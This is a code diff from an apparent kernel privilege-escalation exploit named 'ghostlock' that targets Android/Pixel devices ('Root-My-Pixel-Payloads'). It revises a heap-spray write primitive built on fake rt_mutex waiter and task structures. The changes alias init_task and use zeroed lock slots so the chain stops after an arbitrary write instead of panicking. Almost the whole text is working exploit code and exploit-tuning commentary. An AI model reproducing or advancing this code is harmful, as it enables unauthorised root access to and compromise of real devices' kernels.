@@ -310,7 +310,19 @@ namespace ghostlock::route {
         if (compact) {
             /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
          * the write value, children the write target; waiter->task is the
-         * payload fake_task (planted fields for the PI walk). */
+         * payload fake_task (planted fields for the PI walk).
+         *
+         * v13 (compact=2 / 5.10 legacy only, reference mt6896 design): the
+         * chain only needs the [7] erase — after the write it must STOP, not
+         * walk planted structures on the (gambled) spray page. So:
+         *   task = init_task alias  → wake_up_process in the [9] no-owner exit
+         *     wakes the idle task (reference-proven no-op) instead of ttwu on a
+         *     fake task_struct;
+         *   lock = zero-zone slot   → zeroed rt_mutex: [7] requeue inserts the
+         *     stamped waiter as a black root on the NULL tree (no descent), [9]
+         *     owner==NULL exits. The v12.12 pstore panic (rb_insert_color+0x48,
+         *     NULL gparent read) was this descent on a spray page whose plant
+         *     lost the page-recycling gamble. */
             struct pselect_waiter_word words[] = {
                 {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
                 {3, 0, "tree_right"},
@@ -318,8 +330,12 @@ namespace ghostlock::route {
                 {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
                 {6, 0, "pi_right"},
                 {7, request->target, "pi_left"},
-                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
-                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
+                {8, compact == 2 ? ghostlock::profile::slide_init_task()
+                                 : (session::g_exploit_session.heap.current.fake_task),
+                 "task"},
+                {9, compact == 2 ? support::next_zero_lock_slot()
+                                 : (session::g_exploit_session.heap.current.fake_lock),
+                 "lock"},
                 {10, compact == 2 ? static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO)
                                   : ((static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3),
                  "wake_prio"}, /* 5.10 legacy: prio low half, no wake_state (padding high) */
